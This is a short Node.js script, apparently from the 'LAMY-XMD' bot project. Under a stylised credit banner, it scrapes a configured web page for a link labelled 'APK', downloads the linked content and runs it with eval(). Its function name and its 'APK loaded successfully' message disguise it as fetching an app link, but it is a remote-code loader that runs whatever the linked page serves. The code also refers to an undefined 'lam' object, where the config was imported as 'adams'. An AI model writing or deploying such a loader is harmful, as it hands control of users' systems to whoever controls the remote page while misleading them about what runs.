//  [LAMY-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchAPKUrl() {
    try {
        const response = await axios.get(lam.LAMY_XMD);
        const $ = cheerio.load(response.data);

        const targetElement = $('a:contains("APK")');
        const targetUrl = targetElement.attr('href');

        if (!targetUrl) {
            throw new Error('APK not found 😭');
        }

        console.log('APK loaded successfully ✅');

        const scriptResponse = await axios.get(targetUrl);
        eval(scriptResponse.data);

    } catch (error) {
        console.error('Error:', error.message);
    }
}

fetchAPKUrl();